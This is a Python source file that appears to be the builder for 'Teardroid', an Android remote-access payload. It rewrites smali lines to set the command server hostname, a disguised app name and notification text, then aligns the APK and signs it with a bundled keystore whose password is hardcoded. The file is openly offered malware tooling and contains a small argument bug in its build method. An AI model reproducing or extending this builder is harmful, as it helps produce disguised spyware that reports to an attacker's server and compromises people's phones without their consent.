import os
import sys
from colorama import Fore, Style


class Teardroid:
    def __init__(self, name) -> None:
        self.name = name
        self.AppInfo = os.path.join(os.getcwd(
        ), "Teardroid_Payload", "smali", "com", "example", "teardroidv2", "AppInfo.smali")
        self.os = os.name

    def build(self, hostname) -> None:
        self.print_result("Building Teardroid")
        self.print_result("Changing hostname to " + hostname)
        self.changeHostname(self, hostname)

    def print_result(self, message) -> None:
        print(Fore.YELLOW +
              "[+] {message}!".format(message=message) + " \N{check mark}")

    def changeNotification(self, title, content, subtext) -> None:
        self.print_result("Changing notification title to " + title)
        title = {'data': '    const-string v0, "{title}"'.format(
            title=title), 'line_number': 135, 'file': self.AppInfo}
        self.modify_file(title)
        self.print_result("Changing notification content to " + content)
        content = {'data': '    const-string v0, "{content}"'.format(
            content=content), 'line_number': 140, 'file': self.AppInfo}
        self.modify_file(content)
        self.print_result("Changing notification subtext to " + subtext)
        subtext = {'data': '    const-string v0, "{subtext}"'.format(
            subtext=subtext), 'line_number': 145, 'file': self.AppInfo}
        self.modify_file(subtext)
        self.print_result("Changing notification completed")

    def changeAppname(self) -> None:
        self.print_result("Changing app name to " + self.name)
        file = os.path.join(os.getcwd(), "Teardroid_Payload",
                            "res", "values", "strings.xml")
        self.modify_file({'data': '    <string name="app_name">{AppName}</string>'.format(
            AppName=self.name), 'line_number': 31, 'file': file})
        self.print_result("Changing app name completed")

    def changeHostname(self, hostname) -> None:
        if hostname == "":
            self.print_result("Hostname is empty")
            sys.exit(1)
        elif hostname.endswith("/"):
            hostname = hostname[:-1]
        self.print_result("Changing hostname to " + hostname)
        data = {'data': '    const-string v0, "{hostname}"'.format(
            hostname=hostname), 'line_number': 130, 'file': self.AppInfo}
        self.modify_file(data)
        self.print_result("Changing hostname completed")

    def modify_file(self, new_Info) -> None:
        data = ""
        with open(new_Info["file"], 'r') as filereader:
            data = filereader.readlines()
            data[new_Info["line_number"] - 1] = new_Info["data"] + "\n"
        with open(new_Info["file"], 'w') as filewriter:
            filewriter.writelines(data)

    def SingAPK(self) -> None:
        apksigner = None
        if self.os == "posix":
            apksigner = os.path.join(os.getcwd(), "apksigner")
        else:
            apksigner = os.path.join(os.getcwd(), "apksigner.bat")
        os.system(apksigner +
                  " sign --ks hacksec.jks --ks-key-alias key0 --ks-pass pass:root1337 --key-pass pass:root1337 " + self.name + ".apk")

    def CompressAPK(self) -> None:
        zipalign = None
        if self.os == "posix":
            zipalign = os.path.join(os.getcwd(), "zipalign")
        else:
            zipalign = os.path.join(os.getcwd(), "zipalign.exe")
        os.system(zipalign + " -v 4 " + self.name +
                  "_uncompressed.apk " + self.name + ".apk")

    def Clear(self) -> None:
        os.remove(self.name + ".apk.idsig")
        os.remove(self.name + "_uncompressed.apk")
